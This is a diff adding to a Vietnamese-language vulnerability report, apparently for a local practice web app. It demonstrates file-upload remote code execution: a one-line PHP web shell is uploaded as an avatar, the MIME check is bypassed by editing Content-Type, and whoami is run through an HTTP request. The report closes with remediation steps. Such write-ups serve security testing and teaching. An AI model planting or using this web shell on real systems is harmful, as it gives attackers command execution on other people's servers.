@@ -259,3 +259,55 @@ Tạo file **`pls.php`** với nội dung:
 ```php
 <?php echo system($_GET['command']); ?>
 ```
+### 📌 3. Upload file pls.php thông qua chức năng Upload Avatar
+### 📌 4. Tìm request trong HTTP History và chỉnh sửa
+- Mặc định, hệ thống có thể từ chối .php, nhưng kẻ tấn công có thể đổi header Content-Type để bypass kiểm tra MIME.
+- Nếu file được upload thành công, kiểm tra đường dẫn truy cập:
+http://localhost/web_pen_v1/public/uploads/pls.php
+### 📌 5. Thực thi lệnh từ xa
+Gửi request thực thi lệnh whoami để xác định user chạy webserver:
+```
+GET /web_pen_v1/public/uploads/pls.php?command=whoami HTTP/1.1
+Host: localhost
+````
+-Response trả về:
+```
+nginx
+apache
+```
+-👉 Điều này chứng minh lệnh đã được thực thi trên máy chủ.
+
+### 🚨 6. Ảnh Chụp Màn Hình (PoC Visuals)
+Step	Description	Images
+1	Upload thành công file webshell pls.php.	📷
+2	Intercept request upload và chỉnh sửa Content-Type để bypass kiểm tra MIME.	📷
+3	Truy cập webshell qua trình duyệt và gửi lệnh whoami.	📷
+4	Response hiển thị kết quả apache, chứng minh RCE thành công.	📷
+### 🔧 Biện Pháp Khắc Phục Được Đề Xuất
+#### ✅ 1. Kiểm tra loại file bằng MIME type thay vì chỉ kiểm tra phần mở rộng
+- Sử dụng finfo_file() để kiểm tra loại file thực sự:
+```
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime_type = finfo_file($finfo, $_FILES['avatar']['tmp_name']);
+finfo_close($finfo);
+$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+if (!in_array($mime_type, $allowed_types)) {
+    die("File type not allowed!");
+}
+```
+#### ✅ 2. Đổi tên file khi lưu trữ để ngăn chặn thực thi
+```
+$newFileName = uniqid() . ".jpg";
+move_uploaded_file($_FILES['avatar']['tmp_name'], "uploads/" . $newFileName);
+```
+#### ✅ 3. Vô hiệu hóa PHP trong thư mục uploads bằng .htaccess
+-Tạo file .htaccess trong uploads/ với nội dung:
+```
+<FilesMatch "\.php$">
+    Deny from all
+</FilesMatch>
+```
+#### ✅ 4. Định dạng lại quyền thư mục
+Đặt quyền chmod 644 cho file, chmod 755 cho thư mục uploads để tránh thực thi mã độc.
+
+</details>
